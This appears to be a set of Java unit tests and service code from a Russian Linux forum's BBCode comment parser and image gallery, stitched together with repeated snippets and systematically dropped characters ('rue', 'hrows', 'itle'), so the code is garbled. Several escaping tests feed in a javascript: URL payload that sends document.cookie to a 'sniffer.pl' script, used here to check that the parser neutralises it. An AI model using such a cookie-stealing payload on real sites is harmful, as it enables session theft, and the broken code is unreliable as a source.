public void estToHtmlFormatter ( ) { assertEquals ( RESULT1 , oHtmlFormatter . format ( TEXT1 , false , false ) ) ; assertEquals ( RESULT2 , oHtmlFormatter . format ( TEXT2 , false , false ) ) ; assertEquals ( RESULT3 , oHtmlFormatter20 . format ( TEXT3 , false , false ) ) ; assertEquals ( RESULT8 , oHtmlFormatter20 . format ( TEXT8 , false , false ) ) ; assertEquals ( RESULT9 , oHtmlFormatter . format ( TEXT9 , false , false ) ) ; assertEquals ( RESULT10 , oHtmlFormatter . format ( TEXT10 , false , false ) ) ; assertEquals ( RESULT11 , oHtmlFormatter . format ( TEXT11 , false , false ) ) ; assertEquals ( RESULT12 , oHtmlFormatter . format ( TEXT12 , false , false ) ) ; assertEquals ( RESULT13 , oHtmlFormatter . format ( TEXT13 , false , false ) ) ; assertEquals ( RESULT14 , oHtmlFormatter . format ( TEXT14 , false , false ) ) ; assertEquals ( RESULT15 , oHtmlFormatter . format ( TEXT15 , false , false ) ) ; assertEquals ( RESULT16 , oHtmlFormatter . format ( TEXT16 , false , false ) ) ; assertEquals ( RESULT17 , oHtmlFormatter . format ( TEXT17 , false , false ) ) ; assertEquals ( RESULT17_2 , oHtmlFormatter . format ( TEXT17_2 , false , false ) ) ; assertEquals ( RESULT18 , oHtmlFormatter . format ( TEXT18 , false , false ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( RFC1738 , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( CYR_LINK , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( GOOGLE_CACHE , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( URL_WITH_AT , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( Latin1Supplement , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( greek , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( QP , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( EMPTY_ANCHOR , false , false ) . endsWith ( " </a> " ) ) ; assertTrue ( oHtmlFormatter . format ( SLASH_AFTER_AMP , false , false ) . endsWith ( " </a> " ) ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " est ntest1 ntest2 " , false , false ) ) ; 
public void agEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false , false ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false , false ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false , false ) ) ; 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [BR] " , false , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [B]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [I]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [S]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/QUOTE] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [QUOTE=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/QUOTE] " , false , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false , false ) ) ; } 
public void urlTestNoFollow ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" rel=nofollow>http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false , rue ) ) ; Assert . assertEquals ( " <p><a href= \" http:127.0.0.1:8080 \" >http:127.0.0.1:8080</a></p> " , 
public void autoUrlTestNoFollow ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru/ \" rel=nofollow>http:linux.org.ru/</a></p> " , lorCodeService . parseComment ( " http:linux.org.ru/ " , false , rue ) ) ; Assert . assertEquals ( " <p><a href= \" http:127.0.0.1:8080/ \" >127.0.0.1:8080/</a></p> " , 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/LIST]</code></pre></div> " , lorCodeService . parseComment ( " [CODE][list][*]one[*]two[*]three[/LIST][/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/CODE] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[LIST][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[LIST][*]one[*]two[*]three[/list][/CODE] " , false , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/CODE] " , false , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [CODE=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[QUOTE][i]hz[/I][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [URL=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue , false ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/URL] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com']example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [URL='http:www.example.com]example[/url] " , false , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/LIST] " , false , false ) ) ; 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false , false ) ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false , false ) , citeHeader + " <p>hello world</p> " + citeFooter ) ; 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false , false ) , citeHeader + " <p><cite>maxcom</cite></p><p>hello world</p> " + citeFooter ) ; 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [code][/code] " , false , false ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=cxx]#include <stdio.h>[/code] " , false , false ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , lorCodeService . parseComment ( " [code=foo]#include <stdio.h>[/code] " , false , false ) ) ; 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p> " + citeHeader + " <p><i>hz</i></p> " + citeFooter , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false , false ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , lorCodeService . parseComment ( " some text n some again text [url=http:example.com]example[/url] example " , false , false ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; String html = lorCodeService . parseComment ( msg , rue , false ) ; Assert . assertTrue ( replier . contains ( maxcom ) ) ; Assert . assertTrue ( replier . contains ( JB ) ) ; Assert . assertFalse ( replier . contains ( isden ) ) ; Assert . assertEquals ( " <p><s>hizel</s><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/JB/profile \" >JB</a></span><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" https:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , html ) ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com']example[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url='http:www.example.com]example[/url] " , false , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/list] " , false , false ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , false ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , false ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote Assert.assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public void estBadId ( ) hrows Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/forum/talks/12345678910 " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertFalse ( uri . isMessageUrl ( ) ) ; assertFalse ( uri . isCommentUrl ( ) ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " original " ) ) ; item . setIcon ( rs . getString ( " icon " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( COUNT_ITEMS ) ) ; mav . addObject ( " items " , list ) ; return mav ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + image . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + image . getOriginal ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { ry { builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } } return builder . build ( ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { ry { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } catch ( BadImageException e ) { logger . error ( " Bad image id= " + item . getImage ( ) . getId ( ) , e ) ; } catch ( IOException e ) { logger . error ( " Bad image id= " + item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) ) { return false ; } return author . getScore ( ) > = TopicPermissionService . LINK_FOLLOW_MIN_SCORE ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , HttpServletRequest request , HttpServletResponse response ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { UserStatistics userStat = userDao . getUserStatisticsClass ( user ) ; mv . getModel ( ) . put ( " userStat " , userStat ) ; mv . getModel ( ) . put ( " sectionStat " , prepareSectionStats ( userStat ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; mv . getModel ( ) . put ( " remark " , userDao . getRemark ( mpl . getCurrentUser ( ) , user ) ) ; } if ( mpl . isSessionAuthorized ( ) & & currentUser ) { mv . getModel ( ) . put ( " hasRemarks " , ( userDao . getRemarkCount ( mpl . getCurrentUser ( ) ) > 0 ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; if ( ! Strings . isNullOrEmpty ( userinfo ) ) { mv . getModel ( ) . put ( " userInfoText " , lorCodeService . parseComment ( userinfo , request . isSecure ( ) , ! opicPermissionService . followAuthorLinks ( user ) ) ) ; } mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser 